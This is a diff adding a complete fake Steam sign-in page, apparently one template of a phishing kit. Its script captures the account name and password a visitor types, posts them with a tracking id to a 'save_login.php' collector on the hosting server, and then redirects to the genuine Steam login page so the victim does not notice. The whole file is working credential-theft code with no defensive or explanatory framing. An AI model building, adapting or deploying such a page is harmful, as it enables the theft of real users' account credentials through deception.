@@ -1,0 +1,41 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign In</title><style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"Motiva Sans",Arial,Helvetica,sans-serif;background:linear-gradient(180deg,#1b2838 0%,#171a21 40%);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{background:#171a21;border:1px solid #3d4450;padding:24px;width:100%;max-width:330px}
+.st{color:#1999ff;font-size:22px;font-weight:500;margin-bottom:20px;text-align:center}
+label{display:block;color:#c6d4df;font-size:12px;margin-bottom:4px;text-transform:uppercase}
+input{width:100%;height:40px;background:#32353c;border:1px solid #26282d;color:#dfe3e6;padding:0 10px;margin-bottom:18px;font-size:14px}
+.btn-submit{width:100%;height:44px;background:linear-gradient(90deg,#47bfff,#1a9fff);color:#1b2838;border:none;font-size:15px;font-weight:500;cursor:pointer;border-radius:2px}
+</style></head><body><div class="card"><div class="st">STEAM</div><form id="loginForm"><label>Account name</label><input type="text" id="email" required autocomplete="username"><label>Password</label><input type="password" id="password" required autocomplete="current-password"><button type="submit" class="btn-submit">Sign in</button></form></div><script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<script>
+(function(){
+var BASE_URL = window.location.origin + (window.location.pathname.replace(/[^/]*$/, "") || "/");
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+    var login = document.getElementById("email").value;
+    var password = document.getElementById("password").value;
+    var tid = typeof window.TRACKIFY_TID === "string" ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get("tid") || "");
+    var btn = document.querySelector(".btn-submit");
+    var label = btn.textContent;
+    btn.textContent = "Please wait…";
+    btn.disabled = true;
+    $.ajax({
+        type: "POST",
+        url: BASE_URL + "save_login.php",
+        data: { tid: tid, login: login, password: password, template: "steam" },
+        dataType: "json",
+        success: function (data) {
+            if (data && data.ok) { window.location.href = "https:\/\/store.steampowered.com\/login\/"; return; }
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        },
+        error: function () {
+            btn.textContent = label;
+            btn.disabled = false;
+            alert("Sign in failed. Please try again.");
+        }
+    });
+});
+})();
+</script></body></html>
